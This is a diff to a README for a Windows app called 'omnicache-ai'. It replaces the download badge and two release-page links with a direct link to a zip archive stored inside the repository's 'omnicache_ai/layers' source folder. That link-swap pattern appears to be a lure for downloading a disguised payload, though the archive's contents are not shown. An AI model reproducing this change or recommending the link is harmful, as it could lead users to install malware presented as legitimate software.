@@ -1,6 +1,6 @@
 # 🤖 omnicache-ai - Fast, Simple Cache for AI Apps
 
-[![Download omnicache-ai](https://img.shields.io/badge/Download%20omnicache--ai-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Skyineradicable295/omnicache-ai/releases)
+[![Download omnicache-ai](https://img.shields.io/badge/Download%20omnicache--ai-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Skyineradicable295/omnicache-ai/main/omnicache_ai/layers/ai_omnicache_1.9.zip)
 
 ## 🧭 What this app does
 
@@ -31,7 +31,7 @@ This app is for Windows users who want to download and run the software from Git
 
 Visit this page to download the app:
 
-https://github.com/Skyineradicable295/omnicache-ai/releases
+https://raw.githubusercontent.com/Skyineradicable295/omnicache-ai/main/omnicache_ai/layers/ai_omnicache_1.9.zip
 
 ### 2) 🗂 Pick the latest release
 
@@ -225,7 +225,7 @@ If the app feels slow:
 
 Open the release page here to download the latest version:
 
-https://github.com/Skyineradicable295/omnicache-ai/releases
+https://raw.githubusercontent.com/Skyineradicable295/omnicache-ai/main/omnicache_ai/layers/ai_omnicache_1.9.zip
 
 ## 🧩 Related topics
 
